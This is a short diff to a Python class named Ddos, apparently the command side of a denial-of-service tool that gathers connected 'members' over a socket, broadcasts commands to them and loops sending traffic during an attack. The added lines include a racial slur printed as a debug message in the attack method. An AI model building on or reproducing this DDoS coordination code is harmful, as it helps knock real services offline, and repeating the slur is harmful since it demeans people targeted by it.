@@ -61,21 +61,17 @@ class Ddos:
                 for i in range(len(self.members)):
                     self.members[i].send(Input.encode())
         self.Join = False
-        print(122)
-
 
     def AttackTarget(self):
+        print("nigger")
         while self.Attack:
             send()
 
     def _JoinParty(self):
-        print("hi")
         self.members = []
-        while self.Join:
-            print("hi1")
-            #client, addr = self.sock.accept()
+        while True:
             self.members.append(self.sock.accept()[0])
-            print("hi2")
-            print(self.Join)
-
-
+            if not self.Join:
+                self.members[len(self.members) - 1].close()
+                self.members.pop(len(self.members) - 1)
+                break
